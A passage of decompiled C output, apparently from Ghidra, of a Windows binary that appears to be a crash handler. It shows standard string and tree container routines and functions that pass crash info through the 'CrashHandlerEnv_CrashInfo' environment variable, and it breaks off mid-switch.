    if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      pvVar2 = *this;
    }
    this = FUN_0040ad85((void **)this,extraout_EDX,(void **)this,
                        (void *)((int)param_1 - (int)pvVar2 >> 1),param_2);
  }
  return (void **)this;
}



undefined4 * __thiscall FUN_0040af3c(void *this,uint param_1)

{
  code *pcVar1;
  undefined4 *puVar2;
  void *pvVar3;
  char *unaff_EBP;
  
  if (*(uint *)((int)this + 0x10) < param_1) {
    FUN_00422ed7((undefined4 *)"invalid string position",unaff_EBP);
    pcVar1 = (code *)swi(3);
    puVar2 = (undefined4 *)(*pcVar1)();
    return puVar2;
  }
  *(uint *)((int)this + 0x10) = param_1;
  pvVar3 = this;
  if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
    pvVar3 = *this;
  }
  *(undefined2 *)((int)pvVar3 + param_1 * 2) = 0;
  return (undefined4 *)this;
}



undefined4 * __thiscall FUN_0040af6f(void *this,uint param_1,uint param_2)

{
  uint uVar1;
  code *pcVar2;
  void *pvVar3;
  undefined4 *puVar4;
  char *unaff_EDI;
  int iVar5;
  
  uVar1 = *(uint *)((int)this + 0x10);
  if (uVar1 < param_1) {
    FUN_00422ed7((undefined4 *)"invalid string position",unaff_EDI);
    pcVar2 = (code *)swi(3);
    puVar4 = (undefined4 *)(*pcVar2)();
    return puVar4;
  }
  if (param_2 < uVar1 - param_1) {
    if (param_2 != 0) {
      pvVar3 = this;
      if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
        pvVar3 = *this;
      }
      pvVar3 = (void *)((int)pvVar3 + param_1 * 2);
      iVar5 = uVar1 - param_2;
      FUN_00409529(pvVar3,(void *)((int)pvVar3 + param_2 * 2),iVar5 - param_1);
      *(int *)((int)this + 0x10) = iVar5;
      pvVar3 = this;
      if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
        pvVar3 = *this;
      }
      *(undefined2 *)((int)pvVar3 + iVar5 * 2) = 0;
    }
  }
  else {
    *(uint *)((int)this + 0x10) = param_1;
    pvVar3 = this;
    if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      pvVar3 = *this;
    }
    *(undefined2 *)((int)pvVar3 + param_1 * 2) = 0;
  }
  return (undefined4 *)this;
}



uint __fastcall FUN_0040aff3(void **param_1,uint param_2,void *param_3,char param_4)

{
  code *pcVar1;
  void *pvVar2;
  uint uVar3;
  
  if (param_3 < (void *)0x7fffffff) {
    if (param_1[5] < param_3) {
      FUN_0040b0c0(param_1,param_2,param_3,param_1[4]);
    }
    else if ((param_4 == '\0') || ((void *)0x7 < param_3)) {
      if (param_3 == (void *)0x0) {
        param_1[4] = (void *)0x0;
        if ((void *)0x7 < param_1[5]) {
          param_1 = (void **)*param_1;
        }
        *(undefined2 *)param_1 = 0;
      }
    }
    else {
      pvVar2 = param_1[4];
      if (param_3 < param_1[4]) {
        pvVar2 = param_3;
      }
      FUN_0040ae40(param_1,'\x01',pvVar2);
    }
    return (uint)(param_3 != (void *)0x0);
  }
  FUN_00422ea9(param_1,(short)param_2);
  pcVar1 = (code *)swi(3);
  uVar3 = (*pcVar1)();
  return uVar3;
}



void __thiscall FUN_0040b05c(void *this,int *param_1,int **param_2,int **param_3)

{
  int **ppiVar1;
  int *local_8;
  
                    // WARNING: Load size is inaccurate
  ppiVar1 = *this;
  local_8 = (int *)this;
  if ((param_2 == (int **)*ppiVar1) && (param_3 == ppiVar1)) {
    FUN_004088af(ppiVar1[1]);
                    // WARNING: Load size is inaccurate
    *(int *)(*this + 4) = *this;
                    // WARNING: Load size is inaccurate
    *(undefined4 *)*this = *this;
                    // WARNING: Load size is inaccurate
    *(int *)(*this + 8) = *this;
                    // WARNING: Load size is inaccurate
    *(undefined4 *)((int)this + 4) = 0;
    *param_1 = **this;
  }
  else {
    while (ppiVar1 = param_2, param_2 != param_3) {
      FUN_00402ad4((int **)&param_2);
      FUN_0040b19c(this,&local_8,ppiVar1);
    }
    *param_1 = (int)param_2;
  }
  return;
}



void __fastcall FUN_0040b0c0(void **param_1,uint param_2,void *param_3,void *param_4)

{
  void *pvVar1;
  void **ppvVar2;
  void *pvVar3;
  undefined8 uVar4;
  
  pvVar3 = (void *)((uint)param_3 | 7);
  ppvVar2 = param_1;
  if (pvVar3 < (void *)0x7fffffff) {
    pvVar1 = param_1[5];
    param_2 = (uint)pvVar3 % 3;
    ppvVar2 = (void **)((uint)pvVar1 >> 1);
    param_3 = pvVar3;
    if (((void **)((uint)pvVar3 / 3) < ppvVar2) &&
       (param_3 = (void *)0x7ffffffe, pvVar1 <= (void *)(0x7ffffffeU - (int)ppvVar2))) {
      param_3 = (void *)((int)ppvVar2 + (int)pvVar1);
    }
  }
  uVar4 = _Allocate__(ppvVar2,param_2,(int)param_3 + 1);
  if (param_4 != (void *)0x0) {
    ppvVar2 = param_1;
    if (&DAT_00000008 <= param_1[5]) {
      ppvVar2 = (void **)*param_1;
    }
    copy((void *)uVar4,ppvVar2,(int)param_4);
  }
  FUN_0040ae40(param_1,'\x01',(void *)0x0);
  if (param_1 != (void **)0x0) {
    *param_1 = (void *)uVar4;
  }
  param_1[5] = param_3;
  param_1[4] = param_4;
  if ((void *)0x7 < param_3) {
    param_1 = (void **)*param_1;
  }
  *(undefined2 *)((int)param_1 + (int)param_4 * 2) = 0;
  return;
}



// Library Function - Multiple Matches With Different Base Names
//  public: bool __thiscall std::basic_string<unsigned short,struct std::char_traits<unsigned
// short>,class std::allocator<unsigned short>>::_Inside(unsigned short const *)
//  public: bool __thiscall std::basic_string<wchar_t,struct std::char_traits<wchar_t>,class
// std::allocator<wchar_t>>::_Inside(wchar_t const *)
// 
// Library: Visual Studio 2015 Release

uint __thiscall FID_conflict__Inside(void *this,undefined4 *param_1)

{
  undefined4 *in_EAX;
  void *pvVar1;
  
  if (param_1 != (undefined4 *)0x0) {
    in_EAX = (undefined4 *)this;
    if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
      in_EAX = *this;
    }
    if (in_EAX <= param_1) {
      pvVar1 = this;
      if (7 < *(uint *)((int)this + 0x14)) {
                    // WARNING: Load size is inaccurate
        pvVar1 = *this;
      }
      in_EAX = (undefined4 *)((int)pvVar1 + *(int *)((int)this + 0x10) * 2);
      if (param_1 < in_EAX) {
        return CONCAT31((int3)((uint)in_EAX >> 8),1);
      }
    }
  }
  return (uint)in_EAX & 0xffffff00;
}



void __thiscall FUN_0040b19c(void *this,int **param_1,int **param_2)

{
  undefined uVar1;
  int *piVar2;
  int **_Memory;
  int **ppiVar3;
  int **ppiVar4;
  int **ppiVar5;
  int **ppiVar6;
  
  _Memory = param_2;
  FUN_00402ad4((int **)&param_2);
  ppiVar5 = (int **)*_Memory;
  if (*(char *)((int)ppiVar5 + 0xd) == '\0') {
    ppiVar6 = ppiVar5;
    if ((*(char *)((int)_Memory[2] + 0xd) != '\0') ||
       (ppiVar6 = (int **)param_2[2], param_2 == _Memory)) goto LAB_0040b1d6;
    ppiVar5[1] = (int *)param_2;
    *param_2 = *_Memory;
    ppiVar5 = param_2;
    if (param_2 != (int **)_Memory[2]) {
      ppiVar5 = (int **)param_2[1];
      if (*(char *)((int)ppiVar6 + 0xd) == '\0') {
        ppiVar6[1] = (int *)ppiVar5;
      }
      *ppiVar5 = (int *)ppiVar6;
      param_2[2] = _Memory[2];
      _Memory[2][1] = (int)param_2;
    }
                    // WARNING: Load size is inaccurate
    if (*(int ***)(*this + 4) == _Memory) {
      *(int ***)(*this + 4) = param_2;
    }
    else {
      piVar2 = _Memory[1];
      if ((int **)*piVar2 == _Memory) {
        *piVar2 = (int)param_2;
      }
      else {
        piVar2[2] = (int)param_2;
      }
    }
    param_2[1] = _Memory[1];
    uVar1 = *(undefined *)(param_2 + 3);
    *(undefined *)(param_2 + 3) = *(undefined *)(_Memory + 3);
    *(undefined *)(_Memory + 3) = uVar1;
  }
  else {
    ppiVar6 = (int **)_Memory[2];
LAB_0040b1d6:
    ppiVar5 = (int **)_Memory[1];
    if (*(char *)((int)ppiVar6 + 0xd) == '\0') {
      ppiVar6[1] = (int *)ppiVar5;
    }
                    // WARNING: Load size is inaccurate
    if (*(int ***)(*this + 4) == _Memory) {
      *(int ***)(*this + 4) = ppiVar6;
    }
    else if ((int **)*ppiVar5 == _Memory) {
      *ppiVar5 = (int *)ppiVar6;
    }
    else {
      ppiVar5[2] = (int *)ppiVar6;
    }
                    // WARNING: Load size is inaccurate
    if ((int **)**this == _Memory) {
      ppiVar3 = ppiVar5;
      if (*(char *)((int)ppiVar6 + 0xd) == '\0') {
        ppiVar3 = ppiVar6;
        for (ppiVar4 = (int **)*ppiVar6; *(char *)((int)ppiVar4 + 0xd) == '\0';
            ppiVar4 = (int **)*ppiVar4) {
          ppiVar3 = ppiVar4;
        }
      }
                    // WARNING: Load size is inaccurate
      **this = (int *)ppiVar3;
    }
                    // WARNING: Load size is inaccurate
    if (*(int ***)(*this + 8) == _Memory) {
      ppiVar3 = ppiVar5;
      if (*(char *)((int)ppiVar6 + 0xd) == '\0') {
        ppiVar3 = ppiVar6;
        for (ppiVar4 = (int **)ppiVar6[2]; *(char *)((int)ppiVar4 + 0xd) == '\0';
            ppiVar4 = (int **)ppiVar4[2]) {
          ppiVar3 = ppiVar4;
        }
      }
                    // WARNING: Load size is inaccurate
      *(int ***)(*this + 8) = ppiVar3;
    }
  }
  if (*(char *)(_Memory + 3) != '\x01') {
LAB_0040b3bb:
    FUN_00401df0((int **)(_Memory[5] + -4));
    FUN_00401df0((int **)(_Memory[4] + -4));
    FID_conflict__free(_Memory);
    if (*(int *)((int)this + 4) != 0) {
      *(int *)((int)this + 4) = *(int *)((int)this + 4) + -1;
    }
    *param_1 = (int *)param_2;
    return;
  }
LAB_0040b374:
  ppiVar3 = ppiVar5;
                    // WARNING: Load size is inaccurate
  if ((ppiVar6 == *(int ***)(*this + 4)) || (*(char *)(ppiVar6 + 3) != '\x01')) goto LAB_0040b3b7;
  ppiVar5 = (int **)*ppiVar3;
  if (ppiVar6 == ppiVar5) {
    ppiVar5 = (int **)ppiVar3[2];
    if (*(char *)(ppiVar5 + 3) == '\0') {
      *(undefined *)(ppiVar5 + 3) = 1;
      *(undefined *)(ppiVar3 + 3) = 0;
      FUN_004088fa(this,(int *)ppiVar3);
      ppiVar5 = (int **)ppiVar3[2];
    }
    if (*(char *)((int)ppiVar5 + 0xd) == '\0') {
      if ((*(char *)(*ppiVar5 + 3) != '\x01') || (*(char *)(ppiVar5[2] + 3) != '\x01')) {
        if (*(char *)(ppiVar5[2] + 3) == '\x01') {
          *(undefined *)(*ppiVar5 + 3) = 1;
          *(undefined *)(ppiVar5 + 3) = 0;
          FUN_0040893e(this,(int *)ppiVar5);
          ppiVar5 = (int **)ppiVar3[2];
        }
        *(undefined *)(ppiVar5 + 3) = *(undefined *)(ppiVar3 + 3);
        *(undefined *)(ppiVar3 + 3) = 1;
        *(undefined *)(ppiVar5[2] + 3) = 1;
        FUN_004088fa(this,(int *)ppiVar3);
        goto LAB_0040b3b7;
      }
LAB_0040b36b:
      *(undefined *)(ppiVar5 + 3) = 0;
    }
  }
  else {
    if (*(char *)(ppiVar5 + 3) == '\0') {
      *(undefined *)(ppiVar5 + 3) = 1;
      *(undefined *)(ppiVar3 + 3) = 0;
      FUN_0040893e(this,(int *)ppiVar3);
      ppiVar5 = (int **)*ppiVar3;
    }
    if (*(char *)((int)ppiVar5 + 0xd) == '\0') {
      if ((*(char *)(ppiVar5[2] + 3) == '\x01') && (*(char *)(*ppiVar5 + 3) == '\x01'))
      goto LAB_0040b36b;
      if (*(char *)(*ppiVar5 + 3) == '\x01') {
        *(undefined *)(ppiVar5[2] + 3) = 1;
        *(undefined *)(ppiVar5 + 3) = 0;
        FUN_004088fa(this,(int *)ppiVar5);
        ppiVar5 = (int **)*ppiVar3;
      }
      *(undefined *)(ppiVar5 + 3) = *(undefined *)(ppiVar3 + 3);
      *(undefined *)(ppiVar3 + 3) = 1;
      *(undefined *)(*ppiVar5 + 3) = 1;
      FUN_0040893e(this,(int *)ppiVar3);
LAB_0040b3b7:
      *(undefined *)(ppiVar6 + 3) = 1;
      goto LAB_0040b3bb;
    }
  }
  ppiVar5 = (int **)ppiVar3[1];
  ppiVar6 = ppiVar3;
  goto LAB_0040b374;
}



void FUN_0040b3f7(int *param_1)

{
  char cVar1;
  int *piVar2;
  
  cVar1 = *(char *)((int)param_1 + 0xd);
  while (cVar1 == '\0') {
    FUN_0040b3f7((int *)param_1[2]);
    piVar2 = (int *)*param_1;
    FUN_00401df0((int **)(param_1[5] + -0x10));
    FID_conflict__free(param_1);
    param_1 = piVar2;
    cVar1 = *(char *)((int)piVar2 + 0xd);
  }
  return;
}



int ** __thiscall
FUN_0040b437(void *this,int **param_1,int **param_2,undefined4 param_3,undefined4 *param_4)

{
  int **ppiVar1;
  code *pcVar2;
  int *piVar3;
  int **ppiVar4;
  undefined8 uVar5;
  undefined4 uVar6;
  
  uVar6 = 0x18;
  uVar5 = FUN_00416f82(0x18);
  ppiVar4 = (int **)uVar5;
  if (ppiVar4 != (int **)0x0) {
                    // WARNING: Load size is inaccurate
    *ppiVar4 = *this;
    if (ppiVar4 + 1 != (int **)0x0) {
                    // WARNING: Load size is inaccurate
      ppiVar4[1] = *this;
    }
    if (ppiVar4 + 2 != (int **)0x0) {
                    // WARNING: Load size is inaccurate
      ppiVar4[2] = *this;
    }
    ppiVar1 = ppiVar4 + 4;
    *(undefined2 *)(ppiVar4 + 3) = 0;
    if (ppiVar1 != (int **)0x0) {
      *ppiVar1 = *(int **)*param_4;
      piVar3 = (int *)FUN_0040139e();
      CSimpleStringT__(ppiVar4 + 5,piVar3);
    }
    FUN_0040b4d5(this,param_1,param_2,ppiVar1,ppiVar4);
    return param_1;
  }
  FUN_00422e78(uVar6,(int)((ulonglong)uVar5 >> 0x20));
  pcVar2 = (code *)swi(3);
  ppiVar4 = (int **)(*pcVar2)();
  return ppiVar4;
}



// Library Function - Multiple Matches With Same Base Name
//  unsigned short * __cdecl std::_Allocate<unsigned short>(unsigned int,unsigned short *)
//  wchar_t * __cdecl std::_Allocate<wchar_t>(unsigned int,wchar_t *)
// 
// Library: Visual Studio 2012 Release

undefined8 __fastcall _Allocate__(undefined4 param_1,undefined4 param_2,uint param_3)

{
  int iVar1;
  undefined8 uVar2;
  
  iVar1 = 0;
  if (param_3 != 0) {
    if (param_3 < 0x80000000) {
      uVar2 = FUN_00416f82(param_3 * 2);
      param_2 = (undefined4)((ulonglong)uVar2 >> 0x20);
      iVar1 = (int)uVar2;
      if (iVar1 != 0) goto LAB_0040b4d1;
    }
    uVar2 = FUN_00422e78(iVar1,param_2);
    return uVar2;
  }
LAB_0040b4d1:
  return CONCAT44(param_2,iVar1);
}



int ** __thiscall FUN_0040b4d5(void *this,int **param_1,int **param_2,int **param_3,int **param_4)

{
  int **ppiVar1;
  int **ppiVar2;
  int **ppiVar3;
  bool bVar4;
  char cVar5;
  undefined4 local_10 [2];
  int **local_8;
  
  local_8 = (int **)0x0;
  if (*(int *)((int)this + 4) == 0) {
                    // WARNING: Load size is inaccurate
    FUN_0040b71e(this,param_1,'\x01',*this,this,param_4);
    return param_1;
  }
                    // WARNING: Load size is inaccurate
  ppiVar2 = *this;
  ppiVar3 = (int **)this;
  if (param_2 == (int **)*ppiVar2) {
    ppiVar2 = (int **)this;
    if (param_2[4] <= *param_3) goto LAB_0040b5b5;
  }
  else {
    if (param_2 == ppiVar2) {
      ppiVar3 = (int **)ppiVar2[2];
      if (*param_3 <= ppiVar3[4]) goto LAB_0040b5b5;
      cVar5 = '\0';
      ppiVar2 = ppiVar3;
      goto LAB_0040b5a8;
    }
    bVar4 = param_2[4] < *param_3;
    if (bVar4 || param_2[4] == *param_3) {
LAB_0040b574:
      if (!bVar4) {
LAB_0040b5b5:
        ppiVar2 = (int **)FUN_0040b851(this,local_10,ppiVar3,param_3,param_4);
        *param_1 = *ppiVar2;
        return param_1;
      }
      local_8 = param_2;
      ppiVar2 = FUN_00402ad4((int **)&local_8);
                    // WARNING: Load size is inaccurate
      if ((*ppiVar2 != *this) && (ppiVar3 = (int **)*param_3, local_8[4] <= ppiVar3))
      goto LAB_0040b5b5;
      ppiVar2 = (int **)param_2[2];
      cVar5 = *(char *)((int)ppiVar2 + 0xd);
      ppiVar1 = local_8;
      ppiVar3 = param_2;
    }
    else {
      local_8 = param_2;
      ppiVar2 = FUN_00409256((int **)&local_8);
      ppiVar3 = (int **)*param_3;
      if (ppiVar3 <= (int **)(*ppiVar2)[4]) {
        bVar4 = param_2[4] < ppiVar3;
        goto LAB_0040b574;
      }
      ppiVar2 = (int **)local_8[2];
      cVar5 = *(char *)((int)ppiVar2 + 0xd);
      ppiVar1 = param_2;
      ppiVar3 = local_8;
    }
    param_2 = ppiVar1;
    if (cVar5 != '\0') {
      cVar5 = '\0';
      goto LAB_0040b5a8;
    }
  }
  cVar5 = '\x01';
  ppiVar3 = param_2;
LAB_0040b5a8:
  FUN_0040b71e(this,param_1,cVar5,ppiVar3,ppiVar2,param_4);
  return param_1;
}



int ** __fastcall
FUN_0040b5d5(int **param_1,uint param_2,int **param_3,int **param_4,int *param_5,int **param_6)

{
  int **ppiVar1;
  int *extraout_ECX;
  int *extraout_ECX_00;
  int *extraout_ECX_01;
  int *extraout_ECX_02;
  int *extraout_ECX_03;
  int *piVar2;
  uint extraout_EDX;
  uint extraout_EDX_00;
  uint uVar3;
  undefined8 uVar4;
  char cVar5;
  int **ppiVar6;
  undefined4 local_10 [2];
  int **local_8;
  
  local_8 = (int **)0x0;
  if (param_1[1] == (int *)0x0) {
    FUN_0040929a(param_1,param_3,'\x01',(int **)*param_1,param_1,param_6);
    return param_3;
  }
  ppiVar1 = (int **)*param_1;
  ppiVar6 = param_4;
  if (param_4 == (int **)*ppiVar1) {
    uVar4 = FUN_00407c33(param_5,param_2,(int)param_4[4]);
    uVar3 = (uint)((ulonglong)uVar4 >> 0x20);
    piVar2 = extraout_ECX;
    if (-1 < (int)uVar4) goto LAB_0040b6fe;
  }
  else {
    if (param_4 == ppiVar1) {
      uVar4 = FUN_00407c33(ppiVar1[2] + 4,param_2,*param_5);
      uVar3 = (uint)((ulonglong)uVar4 >> 0x20);
      piVar2 = extraout_ECX_00;
      if (-1 < (int)uVar4) goto LAB_0040b6fe;
      cVar5 = '\0';
      param_4 = (int **)(*param_1)[2];
      goto LAB_0040b6f1;
    }
    uVar4 = FUN_00407c33(param_5,param_2,(int)param_4[4]);
    uVar3 = (uint)((ulonglong)uVar4 >> 0x20);
    if ((int)uVar4 < 0) {
      local_8 = param_4;
      ppiVar1 = FUN_00409256((int **)&local_8);
      uVar4 = FUN_00407c33(*ppiVar1 + 4,extraout_EDX,*param_5);
      uVar3 = (uint)((ulonglong)uVar4 >> 0x20);
      if ((int)uVar4 < 0) {
        piVar2 = local_8[2];
        if (*(char *)((int)piVar2 + 0xd) != '\0') {
          cVar5 = '\0';
          param_4 = local_8;
          goto LAB_0040b6f1;
        }
        goto LAB_0040b6ef;
      }
    }
    uVar4 = FUN_00407c33(param_4 + 4,uVar3,*param_5);
    uVar3 = (uint)((ulonglong)uVar4 >> 0x20);
    piVar2 = extraout_ECX_01;
    if (-1 < (int)uVar4) {
LAB_0040b6fe:
      ppiVar1 = (int **)FUN_00409145(param_1,uVar3,local_10,piVar2,param_5,param_6);
      *param_3 = *ppiVar1;
      return param_3;
    }
    local_8 = param_4;
    ppiVar1 = FUN_00402ad4((int **)&local_8);
    piVar2 = extraout_ECX_02;
    if (*ppiVar1 != *param_1) {
      uVar4 = FUN_00407c33(param_5,extraout_EDX_00,(int)local_8[4]);
      uVar3 = (uint)((ulonglong)uVar4 >> 0x20);
      piVar2 = extraout_ECX_03;
      if (-1 < (int)uVar4) goto LAB_0040b6fe;
    }
    ppiVar6 = local_8;
    if (*(char *)((int)param_4[2] + 0xd) != '\0') {
      cVar5 = '\0';
      goto LAB_0040b6f1;
    }
  }
LAB_0040b6ef:
  cVar5 = '\x01';
  param_4 = ppiVar6;
LAB_0040b6f1:
  FUN_0040929a(param_1,param_3,cVar5,param_4,piVar2,param_6);
  return param_3;
}



void __thiscall
FUN_0040b71e(void *this,int **param_1,char param_2,int **param_3,undefined4 param_4,int **param_5)

{
  int **ppiVar1;
  code *pcVar2;
  int *piVar3;
  undefined4 extraout_ECX;
  undefined2 extraout_DX;
  int **ppiVar4;
  
  if (0xaaaaaa8 < *(uint *)((int)this + 4)) {
    FUN_00401df0((int **)(param_5[5] + -4));
    FID_conflict__free(param_5);
    FUN_00422ea9(extraout_ECX,extraout_DX);
    pcVar2 = (code *)swi(3);
    (*pcVar2)();
    return;
  }
  *(uint *)((int)this + 4) = *(uint *)((int)this + 4) + 1;
  param_5[1] = (int *)param_3;
                    // WARNING: Load size is inaccurate
  if (param_3 == *this) {
    (*this)[1] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    **this = param_5;
                    // WARNING: Load size is inaccurate
    *(int ***)(*this + 8) = param_5;
  }
  else if (param_2 == '\0') {
    param_3[2] = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == *(int ***)(*this + 8)) {
      *(int ***)(*this + 8) = param_5;
    }
  }
  else {
    *param_3 = (int *)param_5;
                    // WARNING: Load size is inaccurate
    if (param_3 == (int **)**this) {
      **this = (int)param_5;
    }
  }
  piVar3 = param_5[1];
  ppiVar4 = param_5;
  do {
    if (*(char *)(piVar3 + 3) != '\0') {
                    // WARNING: Load size is inaccurate
      *(undefined *)(*(int *)(*this + 4) + 0xc) = 1;
      *param_1 = (int *)param_5;
      return;
    }
    ppiVar1 = (int **)ppiVar4[1];
    piVar3 = (int *)*ppiVar1[1];
    if (ppiVar1 == (int **)piVar3) {
      piVar3 = (int *)ppiVar1[1][2];
      if (*(char *)(piVar3 + 3) == '\0') {
LAB_0040b7c8:
        *(undefined *)(ppiVar1 + 3) = 1;
        *(undefined *)(piVar3 + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        ppiVar4 = (int **)ppiVar4[1][1];
      }
      else {
        if (ppiVar4 == (int **)ppiVar1[2]) {
          FUN_004088fa(this,(int *)ppiVar1);
          ppiVar4 = ppiVar1;
        }
        *(undefined *)(ppiVar4[1] + 3) = 1;
        *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
        FUN_0040893e(this,(int *)ppiVar4[1][1]);
      }
    }
    else {
      if (*(char *)(piVar3 + 3) == '\0') goto LAB_0040b7c8;
      if (ppiVar4 == (int **)*ppiVar1) {
        FUN_0040893e(this,(int *)ppiVar1);
        ppiVar4 = ppiVar1;
      }
      *(undefined *)(ppiVar4[1] + 3) = 1;
      *(undefined *)(ppiVar4[1][1] + 0xc) = 0;
      FUN_004088fa(this,(int *)ppiVar4[1][1]);
    }
    piVar3 = ppiVar4[1];
  } while( true );
}



void __thiscall
FUN_0040b851(void *this,undefined4 *param_1,undefined4 param_2,int **param_3,int **param_4)

{
  int **ppiVar1;
  int **_Memory;
  int **ppiVar2;
  undefined4 *puVar3;
  int **extraout_ECX;
  int **ppiVar4;
  int **ppiVar5;
  bool local_8;
  
  ppiVar1 = param_3;
                    // WARNING: Load size is inaccurate
  ppiVar4 = *this;
  local_8 = true;
  ppiVar5 = ppiVar4;
  if (*(char *)((int)ppiVar4[1] + 0xd) == '\0') {
    ppiVar2 = (int **)ppiVar4[1];
    do {
      ppiVar5 = ppiVar2;
      local_8 = *param_3 < ppiVar5[4];
      if (local_8) {
        ppiVar2 = (int **)*ppiVar5;
      }
      else {
        ppiVar2 = (int **)ppiVar5[2];
      }
    } while (*(char *)((int)ppiVar2 + 0xd) == '\0');
  }
  param_3 = ppiVar5;
  if (local_8) {
    if (ppiVar5 == (int **)*ppiVar4) {
      local_8 = true;
      goto LAB_0040b8a5;
    }
    FUN_00409256((int **)&param_3);
    ppiVar4 = extraout_ECX;
  }
  _Memory = param_4;
  ppiVar2 = param_3;
  if (*ppiVar1 <= param_3[4]) {
    FUN_00401df0((int **)(param_4[5] + -4));
    FID_conflict__free(_Memory);
    *param_1 = ppiVar2;
    *(undefined *)(param_1 + 1) = 0;
    return;
  }
LAB_0040b8a5:
  puVar3 = (undefined4 *)FUN_0040b71e(this,(int **)&param_4,local_8,ppiVar5,ppiVar4,param_4);
  *param_1 = *puVar3;
  *(undefined *)(param_1 + 1) = 1;
  return;
}



undefined4 __thiscall FUN_0040b901(void *this,void *param_1)

{
  code *pcVar1;
  HMODULE pHVar2;
  int *piVar3;
  int iVar4;
  char *pcVar5;
  undefined4 uVar6;
  void *local_c;
  HMODULE local_8;
  
  local_c = this;
  local_8 = (HMODULE)this;
  piVar3 = (int *)FUN_0040139e();
  if (piVar3 != (int *)0x0) {
    iVar4 = (**(code **)(*piVar3 + 0xc))();
    local_8 = (HMODULE)(iVar4 + 0x10);
    FUN_00407a7b((int *)&local_8);
    pcVar5 = ATL::CSimpleStringT<char,0>::PrepareWrite((CSimpleStringT_char_0_ *)&local_8,0x41);
    ATL::CSimpleStringT<char,0>::SetLength((CSimpleStringT_char_0_ *)&local_8,0x41);
    iVar4 = FUN_0040775b(param_1,pcVar5,0x41);
    ReleaseBuffer(&local_8,iVar4);
    pHVar2 = local_8;
    uVar6 = 0;
    if (local_8[-3].unused == 0) {
      uVar6 = 0x80070057;
    }
    else {
      FUN_00404cfa(&local_8,(HMODULE)L"CrashHandlerEnv_CrashInfo");
      piVar3 = (int *)FUN_00407adc(&local_c,pHVar2);
      FUN_0040ec13(this,(int **)&local_8,piVar3);
      FUN_00401df0((int **)((int)local_c + -0x10));
      FUN_00401df0((int **)(local_8 + -4));
    }
    FUN_00401df0((int **)(pHVar2 + -4));
    return uVar6;
  }
  ATL::AtlThrowImpl(-0x7fffbffb);
  pcVar1 = (code *)swi(3);
  uVar6 = (*pcVar1)();
  return uVar6;
}



undefined4 __fastcall FUN_0040b9c1(uint *param_1)

{
  uint *puVar1;
  uint *puVar2;
  undefined4 uVar3;
  int iVar4;
  uint *local_8;
  
  local_8 = param_1;
  FUN_00416e80(param_1,0,0x30);
  FUN_00402781((int *)&local_8,L"CrashHandlerEnv_CrashInfo");
  puVar1 = local_8;
  if (local_8[-3] == 0) {
    FUN_00401df0((int **)(local_8 + -4));
    uVar3 = 0x80004005;
  }
  else {
    FUN_0040902a(&local_8,(LPCWSTR)local_8);
    puVar2 = local_8;
    iVar4 = FUN_0040786f((byte *)local_8,local_8[-3],(int)param_1);
    if ((iVar4 < 0) || (iVar4 != 0x30)) {
      FUN_00401df0((int **)(puVar2 + -4));
      FUN_00401df0((int **)(puVar1 + -4));
      uVar3 = 0x8007007a;
    }
    else {
      FUN_00401df0((int **)(puVar2 + -4));
      FUN_00401df0((int **)(puVar1 + -4));
      uVar3 = 0;
    }
  }
  return uVar3;
}



void __fastcall
FUN_0040ba51(void *param_1,uint param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
            int param_6)

{
  uint local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  
  FUN_00416e80(&local_34,0,0x30);
  local_10 = param_3;
  local_c = param_4;
  local_8 = param_5;
  local_30 = *(undefined4 *)(param_6 + 0x40);
  local_2c = *(undefined4 *)(param_6 + 4);
  local_28 = *(undefined4 *)(param_6 + 0x20);
  local_24 = *(undefined4 *)(param_6 + 0xc);
  local_20 = *(undefined4 *)(param_6 + 0x10);
  local_1c = *(undefined4 *)(param_6 + 8);
  local_18 = *(undefined4 *)(param_6 + 0x14);
  local_14 = *(undefined4 *)(param_6 + 0x18);
  local_34 = param_2;
  FUN_0040b901(param_1,&local_34);
  return;
}



int __fastcall
FUN_0040bac8(uint *param_1,undefined4 *param_2,undefined4 *param_3,undefined4 *param_4,
            undefined4 *param_5)

{
  int iVar1;
  void *this;
  undefined4 *puVar2;
  uint uVar3;
  undefined4 *puVar4;
  uint local_3c [2];
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20 [2];
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  uint *local_c;
  
  *param_1 = 0;
  *param_5 = 0;
  *param_2 = 0;
  *param_3 = 0;
  *param_4 = 0;
  local_c = param_1;
  FUN_00416e80(local_3c,0,0x30);
  iVar1 = FUN_0040b9c1(local_3c);
  if (-1 < iVar1) {
    *local_c = local_3c[0];
    *param_2 = local_18;
    *param_3 = local_14;
    *param_4 = local_10;
    this = (void *)FUN_00416f82(0x44);
    if (this == (void *)0x0) {
      puVar2 = (undefined4 *)0x0;
    }
    else {
      puVar2 = FUN_0040f361(this,0,local_34,local_24,local_30,local_2c,local_28,local_20);
    }
    puVar4 = (undefined4 *)0x0;
    if (puVar2 != (undefined4 *)0x0) {
      puVar4 = puVar2;
    }
    uVar3 = FUN_0040f3c0((int)puVar4);
    if ((char)uVar3 == '\0') {
      puVar2 = puVar4;
      iVar1 = -0x7fffbffb;
    }
    else {
      puVar2 = (undefined4 *)0x0;
      *param_5 = puVar4;
      iVar1 = 0;
    }
    if (puVar2 != (undefined4 *)0x0) {
      FUN_0040ad35(puVar2);
    }
  }
  return iVar1;
}



void * __fastcall FUN_0040bb85(void *param_1,undefined4 param_2)

{
  wchar_t *pwVar1;
  
  switch(param_2) {
  case 0:
    pwVar1 = L"Normal";
    break;
  case 1:
    pwVar1 = L"Error occurred during analysis";
    break;
  case 2:
